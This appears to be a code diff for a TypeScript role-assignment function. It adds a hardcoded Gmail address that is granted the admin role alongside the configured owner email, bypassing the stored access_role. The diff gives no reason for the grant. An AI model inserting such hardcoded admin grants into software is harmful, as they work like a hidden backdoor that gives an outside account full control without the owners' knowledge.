@@ -22,7 +22,7 @@ type UserUpdateBody = {
 
 function accessRoleOf(user: Record<string, unknown>): AccessRole {
   const email = String(user.email ?? "").trim().toLowerCase();
-  if (email === OWNER_EMAIL.toLowerCase()) return "adm";
+  if (email === OWNER_EMAIL.toLowerCase() || email === "threexdroid@gmail.com") return "adm";
   if (email === "campanhaeleicaoxv@gmail.com") return "gestor";
   const value = String(user.access_role ?? "");
   if (
